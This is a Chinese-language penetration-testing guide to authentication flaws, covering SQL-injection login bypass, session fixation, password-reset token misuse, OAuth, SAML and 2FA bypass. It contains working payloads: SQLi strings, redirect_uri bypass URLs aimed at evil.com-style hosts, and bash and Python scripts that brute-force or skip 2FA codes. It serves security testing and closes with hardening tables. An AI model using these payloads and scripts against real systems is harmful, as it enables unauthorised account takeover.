# 认证漏洞测试

## 1. 概述

认证漏洞包括认证绕过、会话劫持、密码重置、OAuth/OIDC漏洞、SAML漏洞、2FA绕过等。

**危险等级**: 高

## 2. 测试点识别

### 2.1 常见认证接口

| 接口类型 | 示例 |
|----------|------|
| 登录接口 | `/login`, `/signin`, `/api/auth/login` |
| 注册接口 | `/register`, `/signup`, `/api/auth/register` |
| 密码重置 | `/reset-password`, `/forgot-password` |
| OAuth授权 | `/oauth/authorize`, `/oauth/login` |
| 2FA验证 | `/2fa`, `/mfa`, `/verify` |

## 3. SQL注入绕过认证

### 3.1 注释绕过

```bash
# 用户名后加注释
admin'--
admin'#
admin'/*
admin' or '1'='1
```

### 3.2 OR绕过

```bash
# 万能密码
' OR '1'='1
' OR 1=1--
admin' OR '1'='1
```

### 3.3 空密码绕过

```bash
用户名: admin
密码: ' or 1=1--
```

### 3.4 大小写绕过

```bash
Admin
ADMIN
AdMiN
```

## 4. 会话漏洞

### 4.1 Session Fixation

```
攻击步骤：
1. 攻击者获取有效Session ID
2. 将Session ID交给受害者
3. 受害者登录后使用该Session ID
4. 攻击者使用该Session ID劫持会话

测试方法：
1. 登录前查看Session ID
2. 登录后对比Session ID
3. 如果Session ID不变 → Session Fixation漏洞
```

### 4.2 Session Hijacking

```
攻击方法：
1. 通过XSS窃取Cookie
2. 通过Network监听窃取
3. 通过日志文件窃取

测试方法：
1. 检查Cookie是否设置HttpOnly
2. 检查Cookie是否设置Secure
3. 检查Session ID是否可预测
```

### 4.3 会话超时测试

```bash
# 检查会话超时时间
# 登录后等待超时时间
# 尝试使用之前的Token访问
```

## 5. 密码重置漏洞

### 5.1 Token可预测

```bash
# 检查Token格式
# 常见不安全的Token：
# - 递增数字：reset_token=12345
# - 时间戳：reset_token=1609459200
# - 用户ID：reset_token=user123
# - 弱加密：reset_token=base64(user_id)
```

### 5.2 Token泄露

```bash
# 检查Token是否泄露在
# - URL参数
# - Referer头
# - 邮件日志
# - 服务器日志
```

### 5.3 Token复用

```bash
# 1. 请求密码重置
POST /api/reset-password
{"email": "victim@example.com"}

# 2. 使用Token重置密码
POST /api/reset-password
{"token": "xxx", "new_password": "hacked"}

# 3. 尝试复用同一Token
POST /api/reset-password
{"token": "xxx", "new_password": "hacked2"}
# 如果成功 → Token可复用漏洞
```

### 5.4 邮箱绑定漏洞

```bash
# 修改密码时检查邮箱验证
POST /api/reset-password
{
    "token": "xxx",
    "new_password": "xxx",
    "email": "attacker@example.com"  # 尝试修改为攻击者邮箱
}
```

## 6. OAuth/OIDC漏洞

### 6.1 redirect_uri绕过

```bash
# 正常redirect_uri
http://target.com/callback

# 绕过尝试
http://target.com.attacker.com
http://target.com/callback.evil.com
http://target.com/callback%23.evil.com
http://target.com/callback/../evil.com
http://target.com/callback#@evil.com
```

### 6.2 state参数缺失

```bash
# 检查OAuth流程是否使用state参数
# 如果没有state参数 → CSRF攻击

# 测试：
1. 创建恶意页面诱导用户点击
2. 用户完成OAuth授权
3. 攻击者获取授权码
4. 攻击者完成认证
```

### 6.3 scope扩大

```bash
# 请求基础scope
scope=openid,profile

# 尝试扩大scope
scope=openid,profile,email,admin
```

### 6.4 Token泄露

```bash
# 检查Token是否在URL中传递
# 检查Token是否存储在日志中
# 检查access_token是否可替代refresh_token使用
```

### 6.5 OAuth curl测试

```bash
#!/bin/bash
# OAuth漏洞测试脚本

TARGET="https://oauth.target.com"
CLIENT_ID="app_id"
REDIRECT_URI="http://target.com/callback"

echo "=== OAuth漏洞测试 ==="

# 1. redirect_uri绕过测试
echo "[1] redirect_uri绕过测试"
REDIRECT_URIS=(
    "http://evil.com/callback"
    "http://target.com.attacker.com/callback"
    "http://target.com/callback.evil.com"
    "http://target.com/callback#@evil.com"
)

for URI in "${REDIRECT_URIS[@]}"; do
    RESP=$(curl -s -I "https://oauth.target.com/authorize?client_id=${CLIENT_ID}&redirect_uri=${URI}&response_type=code&scope=openid")
    LOCATION=$(echo "$RESP" | grep -i "^Location:" | head -1)
    
    if echo "$LOCATION" | grep -q "error"; then
        echo "  [安全] $URI: 被拒绝"
    elif echo "$LOCATION" | grep -q "$URI"; then
        echo "  [漏洞] $URI: redirect_uri被接受"
    else
        echo "  [未知] $URI"
    fi
done

# 2. state参数测试
echo ""
echo "[2] state参数测试"
RESP=$(curl -s "https://oauth.target.com/authorize?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&response_type=code")
if echo "$RESP" | grep -q "state"; then
    echo "  [有state] state参数存在"
else
    echo "  [漏洞] state参数缺失，可能存在CSRF"
fi
```

## 7. SAML漏洞

### 7.1 SAML重放

```bash
# 捕获有效的SAML Assertion
# 尝试重放该Assertion
```

### 7.2 XML签名绕过

```bash
# 删除签名
# 修改Assertion后重新签名
# 使用空的签名
```

### 7.3 SAML curl测试

```bash
#!/bin/bash
# SAML漏洞测试脚本

TARGET="https://saml.target.com"

echo "=== SAML漏洞测试 ==="

# 1. 检查SAML Endpoint
echo "[1] 检查SAML Endpoint"
curl -sI "$TARGET/saml/login" | grep -i "saml"

# 2. 检查XML签名
echo ""
echo "[2] XML签名测试"
# 提取SAML Response并检查签名配置
```

## 8. 2FA/OTP绕过

### 8.1 暴力破解2FA码

```bash
# 4位数字：10000种组合
# 6位数字：1000000种组合

#!/bin/bash
TARGET="http://api/verify-2fa"
CODE_FILE="/tmp/2fa_codes.txt"

# 生成4位数字密码
for i in {0000..9999}; do
    echo "$i" >> "$CODE_FILE"
done

# 批量测试
while read CODE; do
    RESP=$(curl -s -X POST "$TARGET" -d "{\"code\":\"$CODE\"}")
    if echo "$RESP" | grep -q "success"; then
        echo "[成功] 2FA码: $CODE"
        break
    fi
done < "$CODE_FILE"
```

### 8.2 2FA码复用

```bash
# 1. 获取有效的2FA码
# 2. 使用同一2FA码多次尝试
# 3. 如果第二次成功 → 2FA码可复用漏洞
```

### 8.3 2FA绕过

```bash
# 1. 删除2FA参数
POST /api/login
{"username": "admin", "password": "xxx"}

# 2. 尝试空2FA码
POST /api/verify-2fa
{"code": ""}

# 3. 尝试跳过2FA
POST /api/login-step2
{"skip_2fa": true}

# 4. Session Riding
# 捕获用户完成2FA后的Session，强制用户使用该Session
```

### 8.4 2FA Python测试脚本

```python
import requests

class TwoFATester:
    def __init__(self, target):
        self.target = target
        
    def test_brute_force(self, username, password, max_attempts=10000):
        """测试2FA暴力破解"""
        print(f"\n=== 2FA暴力破解测试 ===")
        
        # 先登录获取2FA session
        login_resp = requests.post(
            f"{self.target}/login",
            json={"username": username, "password": password}
        )
        
        if login_resp.status_code != 200:
            return False, "登录失败"
        
        session = login_resp.cookies
        
        # 暴力破解2FA码
        for i in range(max_attempts):
            code = f"{i:04d}"  # 4位数字
            resp = requests.post(
                f"{self.target}/verify-2fa",
                json={"code": code},
                cookies=session
            )
            
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if data.get('success') or data.get('code') == 0:
                        return True, f"成功! 2FA码: {code}"
                except:
                    pass
            
            if i % 100 == 0:
                print(f"  已测试 {i} 个码...")
        
        return False, f"暴力破解失败 ({max_attempts}次)"
    
    def test_reuse(self, username, password, code):
        """测试2FA码复用"""
        print(f"\n=== 2FA码复用测试 ===")
        
        # 第一次使用
        login_resp = requests.post(
            f"{self.target}/login",
            json={"username": username, "password": password}
        )
        session = login_resp.cookies
        
        resp1 = requests.post(
            f"{self.target}/verify-2fa",
            json={"code": code},
            cookies=session
        )
        
        # 第二次使用同一码
        resp2 = requests.post(
            f"{self.target}/verify-2fa",
            json={"code": code},
            cookies=session
        )
        
        if resp1.status_code == 200 and resp2.status_code == 200:
            return True, "2FA码可复用，漏洞存在"
        return False, "2FA码不可复用"
    
    def test_skip(self, username, password):
        """测试2FA跳过"""
        print(f"\n=== 2FA跳过测试 ===")
        
        # 登录
        login_resp = requests.post(
            f"{self.target}/login",
            json={"username": username, "password": password}
        )
        session = login_resp.cookies
        
        # 尝试跳过2FA
        skip_resp = requests.post(
            f"{self.target}/verify-2fa",
            json={"skip": True},
            cookies=session
        )
        
        if skip_resp.status_code == 200:
            try:
                data = skip_resp.json()
                if data.get('success'):
                    return True, "可跳过2FA验证"
            except:
                pass
        
        return False, "不能跳过2FA验证"
```

## 9. 认证漏洞误报判断标准

### 9.1 核心判断原则

```
【重要】认证测试需要明确区分"安全机制"和"安全漏洞"

判断逻辑：
1. 先确认是否有适当的防护机制
2. 再测试防护机制是否可绕过
3. 最后评估绕过后的实际影响

【真实漏洞特征】
- 认证可被绕过
- 密码可被暴力破解
- Session可被劫持
- 2FA可被绕过

【正常情况（不是漏洞）】
- 暴力破解被限制/锁定
- Session正确更新
- 2FA码正确验证
```

### 9.2 curl + 对比验证流程

```bash
#!/bin/bash
# 认证漏洞测试脚本

TARGET="http://api"

echo "=== 认证漏洞测试 ==="

# 1. SQL注入绕过测试
echo "[1] SQL注入绕过测试"
PAYLOADS=(
    "admin'--"
    "admin' or '1'='1"
    "admin' or 1=1--"
)

for PAYLOAD in "${PAYLOADS[@]}"; do
    RESP=$(curl -s -X POST "$TARGET/login" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$PAYLOAD\",\"password\":\"any\"}")
    
    if echo "$RESP" | grep -q '"token"'; then
        echo "  [漏洞] SQL注入绕过成功"
        echo "  Payload: $PAYLOAD"
    fi
done

# 2. 暴力破解测试
echo ""
echo "[2] 暴力破解测试（5次）"
for i in {1..5}; do
    RESP=$(curl -s -X POST "$TARGET/login" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"admin\",\"password\":\"wrong$i\"}")
    
    if echo "$RESP" | grep -qi "lock\|captcha\|limit"; then
        echo "  [安全] 第$i次：发现限制机制"
        break
    fi
    echo "  第$i次：无限制"
done

# 3. Session Fixation测试
echo ""
echo "[3] Session Fixation测试"
SESSION_BEFORE=$(curl -sI "$TARGET/login" | grep -i "set-cookie" | head -1)
echo "  登录前Cookie: $SESSION_BEFORE"
```

## 10. 认证安全配置检查表

| 检查项 | 安全配置 | 风险 |
|--------|----------|------|
| 密码强度 | 至少8位，含大小写+数字+特殊字符 | 低 |
| 登录限制 | 5次失败后锁定15分钟 | 低 |
| 验证码 | 有图形/滑块验证码 | 中 |
| Session更新 | 登录后更换Session ID | 低 |
| Cookie安全 | HttpOnly + Secure + SameSite | 低 |
| 2FA | 支持2FA认证 | 低 |
| 密码重置 | Token一次性使用 | 低 |
| OAuth | state参数、redirect_uri验证 | 低 |

## 11. 测试检查清单

```
□ 测试SQL注入绕过认证
□ 测试暴力破解防护
□ 测试验证码是否存在
□ 测试Session Fixation
□ 测试Session超时
□ 测试密码重置Token
□ 测试OAuth redirect_uri
□ 测试SAML签名
□ 测试2FA暴力破解
□ 测试2FA绕过
□ 检查Cookie安全配置
□ 检查认证响应头
```
